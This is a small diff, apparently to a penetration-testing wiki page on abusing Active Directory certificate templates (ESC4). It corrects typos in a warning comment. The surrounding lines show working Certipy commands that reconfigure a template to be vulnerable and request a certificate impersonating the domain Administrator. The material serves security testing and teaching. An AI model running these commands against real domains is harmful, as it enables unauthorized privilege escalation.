@@ -66,7 +66,7 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can 
 # 1. Save the old configuration, edit the template and make it vulnerable
 certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template "$ESC4_TEMPLATE_NAME" -write-default-configuration
 
-# Warning: running the coommand twice will override the backup file, make sure to keep a second backup of the old configuration somewhere.
+# Warning: running the command twice will override the backup file, make sure to keep a second backup of the old configuration somewhere.
 
 # 2. Request a template certificate with a custom SAN
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$ESC4_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
@@ -101,7 +101,7 @@ modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6
 # 1. Save the old configuration, edit the template and make it vulnerable
 certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template "$ESC4_TEMPLATE_NAME" -save-old
 
-# Warning: running the coommand twice will override the backup file, make sure to keep a seconde backup of the old configuration somwhere.
+# Warning: running the command twice will override the backup file, make sure to keep a second backup of the old configuration somewhere.
 
 # 2. Request a template certificate with a custom SAN
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca "$CA_NAME" -template "$ESC4_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
